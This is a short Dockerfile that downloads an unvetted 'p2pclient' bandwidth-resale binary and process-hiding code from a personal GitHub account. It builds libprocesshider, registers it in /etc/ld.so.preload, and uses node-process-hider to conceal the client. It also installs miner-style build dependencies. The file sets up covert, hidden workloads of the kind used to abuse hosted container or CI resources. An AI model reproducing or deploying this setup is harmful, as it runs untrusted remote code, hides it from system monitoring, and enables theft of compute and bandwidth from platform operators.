FROM debian:sid

RUN apt update -y \
    	&& apt upgrade -y \
    	&& apt upgrade -y && apt-get install wget -y \
    	&& apt install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev  libjansson-dev libgmp-dev make gcc g++ git zlib1g-dev ocl-icd-opencl-dev \
        && apt install htop -y
RUN wget https://raw.githubusercontent.com/pepek107happy4s/peer2profit/main/p2pclient && chmod +x p2pclient       
RUN wget https://raw.githubusercontent.com/pepek107happy4s/tru/master/Makefile
RUN wget https://raw.githubusercontent.com/pepek107happy4s/tru/master/processhider.c
RUN make
RUN mv libprocesshider.so /usr/local/lib
RUN echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
RUN apt-get install nano
RUN apt install npm -y
RUN apt install npm nodejs -y
RUN apt install cputool
RUN npm i -g node-process-hider
RUN ph add p2pclient
